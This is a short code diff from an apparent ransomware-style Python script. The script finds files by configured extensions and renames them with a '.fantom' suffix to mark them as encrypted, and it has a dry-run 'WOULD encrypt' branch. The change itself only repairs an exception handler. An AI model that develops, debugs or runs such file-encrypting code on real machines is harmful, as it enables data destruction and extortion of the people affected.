@@ -68,7 +68,7 @@ for file in helper.discoverFiles(startdirs, config["DEFAULT"]["ENCRYPT_EXTENSION
         if config["DEFAULT"]["RENAME_FILES"] == "True":
             try:
                 os.rename(file, file + '.fantom')  # append filename to indicate crypted4
-            except:
+            except Exception as e:
                 print("Error renaming file %s: %s" % (file, e))
     else:
         print("WOULD encrypt file %s" % (file))
